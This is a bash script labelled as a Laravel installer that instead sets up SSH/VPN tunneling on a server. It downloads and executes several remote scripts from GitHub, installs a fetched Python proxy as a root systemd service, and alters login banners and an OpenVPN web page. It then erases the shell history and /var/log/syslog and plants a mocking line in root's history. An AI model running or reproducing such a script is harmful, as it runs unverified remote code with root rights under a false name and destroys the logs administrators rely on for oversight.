#!/bin/bash
# Laravel Installer
# Script by Juan
# 
# Illegal selling and redistribution of this script is strictly prohibited
# Please respect author's Property
# Binigay sainyo ng libre, ipamahagi nyo rin ng libre.
#
#

# Install AutoScript
function ssh() {
    rm -f DebianVPS* && wget -q 'https://raw.githubusercontent.com/Bonveio/BonvScripts/master/DebianVPS-Installer' && chmod +x DebianVPS-Installer && ./DebianVPS-Installer 
    rm -f /etc/banner
    wget -qO /etc/banner https://raw.githubusercontent.com/bannerpy/Files/main/Senpainnload
    dos2unix -q /etc/banner
    service ssh restart
    service sshd restart
    service dropbear restart
}
ssh

function service() {
# Getting Proxy Template
wget -q -O /etc/senpaiscript raw.githubusercontent.com/bannerpy/Files/main/senpaipy
chmod +x /etc/senpaiscript
}
service

function service1() {
# Installing Service
cat << END > /etc/systemd/system/senpaiscript.service 
[Unit]
Description=Project Seve
Documentation=https://google.com
After=network.target nss-lookup.target

[Service]
Type=simple
User=root
CapabilityBoundingSet=CAP_NET_ADMIN CAP_NET_BIND_SERVICE
AmbientCapabilities=CAP_NET_ADMIN CAP_NET_BIND_SERVICE
NoNewPrivileges=true
ExecStart=/usr/bin/python -O /etc/senpaiscript
Restart=on-failure

[Install]
WantedBy=multi-user.target
END
}
service1

function setting() {
sed -i "/DEFAULT_HOST = '127.0.0.1:443'/c\DEFAULT_HOST = '127.0.0.1:550'" /etc/senpaiscript

systemctl daemon-reload
systemctl enable senpaiscript
systemctl restart senpaiscript
}
setting

function remove() {
echo "" > .bash_history 
history -c
echo '' > /var/log/syslog
}
remove

wget -q 'https://github.com/Projectmarkallen/projectmark/raw/main/Antitorrentado.sh' && chmod +x Antitorrentado.sh && ./Antitorrentado.sh


clear

sed -i "s|https://openvpn.net/wp-content/uploads/openvpn.jpg|https://i.postimg.cc/7PptDq93/1640223307226.jpg|g" /var/www/openvpn/index.html && service nginx restart


rm /root/.bash_history
echo 'UTUT MU' > /root/.bash_history

echo "𝙏𝙃𝙄𝙎 𝙄𝙎 𝙉𝙊𝙏 𝙁𝙊𝙍 𝙎𝘼𝙇𝙀"
echo "𝙎𝙀𝙉𝙋𝘼𝙄 𝘾𝙊𝙉𝙁𝙄𝙂"
